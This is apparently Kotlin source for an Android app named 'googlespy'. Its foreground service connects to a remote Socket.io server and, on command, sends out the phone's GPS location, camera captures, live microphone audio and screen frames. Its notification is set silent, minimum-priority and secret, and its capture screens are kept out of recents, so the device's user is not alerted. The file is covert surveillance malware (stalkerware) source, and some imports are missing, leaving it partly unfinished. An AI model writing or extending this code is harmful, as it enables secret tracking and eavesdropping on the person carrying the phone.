package com.example.googlespy.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Intent
import android.os.Build
import androidx.core.content.ContextCompat
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleService
import com.example.googlespy.MainActivity
import com.example.googlespy.R
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.net.URI
import java.net.URLEncoder
import java.nio.charset.StandardCharsets

/**
 * Foreground service: keeps Socket.io connection, joins room by login,
 * relays request_* from server and emits *_data responses.
 */
class DeviceControlService : LifecycleService() {

    private var socket: Socket? = null
    private val mainHandler = Handler(Looper.getMainLooper())
    private var reconnectRunnable: Runnable? = null
    private var serverUrl: String = ""
    private var login: String = ""
    private var password: String = ""

    override fun onCreate() {
        super.onCreate()
        instance = this
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        when (intent?.action) {
            ACTION_STOP -> {
                stopSelf()
                return START_NOT_STICKY
            }
            else -> {
                serverUrl = intent?.getStringExtra(EXTRA_SERVER_URL) ?: return START_NOT_STICKY
                login = intent.getStringExtra(EXTRA_LOGIN) ?: return START_NOT_STICKY
                password = intent.getStringExtra(EXTRA_PASSWORD) ?: return START_NOT_STICKY
            }
        }
        try {
            startForeground(NOTIFICATION_ID, buildNotification())
        } catch (e: Exception) {
            stopSelf()
            return START_NOT_STICKY
        }
        connect()
        return START_STICKY
    }

    override fun onBind(intent: Intent): IBinder? {
        super.onBind(intent)
        return null
    }

    override fun onDestroy() {
        instance = null
        cancelReconnect()
        socketRef = null
        socket?.disconnect()
        socket?.off()
        socket = null
        super.onDestroy()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                getString(R.string.notification_channel_name),
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                setSound(null, null)
                enableVibration(false)
                enableLights(false)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        val pending = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(getString(R.string.notification_title))
            .setContentText(getString(R.string.notification_text))
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pending)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .build()
    }

    private fun connect() {
        cancelReconnect()
        try {
            val query = "login=${encode(login)}&password=${encode(password)}&pass=${encode(password)}"
            val sep = if (serverUrl.contains("?")) "&" else "?"
            val uri = URI("$serverUrl$sep$query")
            val opts = IO.Options().apply {
                forceNew = true
                reconnection = false
            }
            socket = IO.socket(uri, opts).apply {
                on(Socket.EVENT_CONNECT) { setupListeners() }
                on(Socket.EVENT_DISCONNECT) { scheduleReconnect() }
                on(Socket.EVENT_CONNECT_ERROR) { scheduleReconnect() }
                connect()
            }
        } catch (e: Exception) {
            scheduleReconnect()
        }
    }

    private fun Socket.setupListeners() {
        on("request_gps") { sendGps() }
    }

    private fun sendGps() {
        val locHelper = LocationHelper(this)
        locHelper.getLastLocation { lat, lon, err ->
            val payload = JSONObject().apply {
                put("lat", lat ?: 0.0)
                put("lon", lon ?: 0.0)
                if (err != null) put("error", err)
            }
            socket?.emit("gps_data", payload)
        }
    }

    private fun sendCamera() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            socket?.emit("camera_data", JSONObject().put("error", "camera_permission_denied"))
            return
        }
        socketRef = socket
        cameraResultReceived = false
        val runnable = Runnable {
            if (!cameraResultReceived) {
                cameraResultReceived = true
                socketRef?.emit("camera_data", JSONObject().put("error", "timeout"))
            }
        }
        cameraTimeoutRunnable = runnable
        cameraHandler = mainHandler
        mainHandler.postDelayed(runnable, 20000L)
        val intent = Intent(this, com.example.googlespy.CameraCaptureActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS or Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_SINGLE_TOP)
        }
        try {
            startActivity(intent)
        } catch (e: Exception) {
            mainHandler.removeCallbacks(runnable)
            cameraResultReceived = true
            val payload = JSONObject().put("error", e.message ?: "start_activity_failed")
            socket?.emit("camera_data", payload)
        }
    }

    private var micStreamHelper: MicStreamHelper? = null

    private fun startMicStream() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            socket?.emit("mic_data", JSONObject().put("error", "mic_permission_denied"))
            return
        }
        stopMicStream()
        micStreamHelper = MicStreamHelper(
            this,
            onChunk = { base64, sampleRate, channels ->
                val payload = JSONObject()
                    .put("chunk", base64)
                    .put("sampleRate", sampleRate)
                    .put("channels", channels)
                socket?.emit("mic_data", payload)
            },
            onError = { err ->
                socket?.emit("mic_data", JSONObject().put("error", err))
            }
        )
        micStreamHelper?.start()
    }

    private fun stopMicStream() {
        micStreamHelper?.stop()
        micStreamHelper = null
    }

    private var mediaProjection: android.media.projection.MediaProjection? = null
    private var screenCaptureHelper: ScreenCaptureHelper? = null

    fun onScreenProjectionResult(resultCode: Int, data: Intent) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return
        val mgr = getSystemService(MediaProjectionManager::class.java)
        mediaProjection = mgr.getMediaProjection(resultCode, data)
        if (mediaProjection == null) {
            socket?.emit("screen_data", JSONObject().put("error", "media_projection_failed"))
            return
        }
        screenCaptureHelper = ScreenCaptureHelper(
            this,
            mediaProjection!!,
            onFrame = { base64 ->
                socket?.emit("screen_data", JSONObject().put("jpeg", base64))
            },
            onError = { err ->
                socket?.emit("screen_data", JSONObject().put("error", err))
            }
        )
        screenCaptureHelper?.start()
    }

    fun onScreenProjectionError(err: String) {
        socket?.emit("screen_data", JSONObject().put("error", err))
    }

    private fun startScreenCapture() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            socket?.emit("screen_data", JSONObject().put("error", "api_21_required"))
            return
        }
        stopScreenCapture()
        val intent = Intent(this, com.example.googlespy.ScreenCaptureActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS or Intent.FLAG_ACTIVITY_NO_HISTORY)
        }
        try {
            startActivity(intent)
        } catch (e: Exception) {
            socket?.emit("screen_data", JSONObject().put("error", e.message ?: "start_activity_failed"))
        }
    }

    private fun stopScreenCapture() {
        screenCaptureHelper?.stop()
        screenCaptureHelper = null
        try {
            mediaProjection?.stop()
        } catch (_: Exception) {}
        mediaProjection = null
    }

    private fun scheduleReconnect() {
        cancelReconnect()
        reconnectRunnable = Runnable {
            connect()
        }
        mainHandler.postDelayed(reconnectRunnable!!, RECONNECT_DELAY_MS)
    }

    private fun cancelReconnect() {
        reconnectRunnable?.let { mainHandler.removeCallbacks(it) }
        reconnectRunnable = null
    }

    private fun encode(s: String): String =
        URLEncoder.encode(s, StandardCharsets.UTF_8.name())

    companion object {
        const val CHANNEL_ID = "device_control_channel"
        private const val NOTIFICATION_ID = 1
        private const val RECONNECT_DELAY_MS = 5000L

        const val ACTION_STOP = "com.example.googlespy.STOP"
        const val EXTRA_SERVER_URL = "server_url"
        const val EXTRA_LOGIN = "login"
        const val EXTRA_PASSWORD = "password"

        @Volatile
        var instance: DeviceControlService? = null

        @Volatile
        var socketRef: Socket? = null
    }
}
